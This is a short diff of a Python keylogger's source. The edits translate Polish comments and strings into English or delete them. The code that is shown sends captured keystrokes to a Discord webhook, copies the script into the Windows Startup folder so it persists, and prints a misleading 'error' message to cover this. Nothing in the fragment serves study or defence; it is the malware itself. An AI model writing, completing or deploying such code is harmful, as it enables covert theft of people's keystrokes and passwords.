@@ -12,7 +12,7 @@ import json
 def send_to_discord(keys):
     webhook_url = 'webhook !!!!!!!!!'
     data = {
-        'content': "Lista klawiszy:\n" + ''.join(keys)
+        'content': "key list:\n" + ''.join(keys)
     }
     headers = {
         'Content-Type': 'application/json'
@@ -42,14 +42,11 @@ def key_pressed(key):
         words_count = 0
 
 def main():
-    # Katalog docelowy autostartu w systemie Windows
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    
-    # Ścieżka do tego skryptu
+
     current_script = os.path.abspath(__file__)
     
     try:
-        # Kopiowanie tego skryptu do katalogu autostartu
         shutil.copy(current_script, startup_folder)
         print("error")
     except Exception as e:
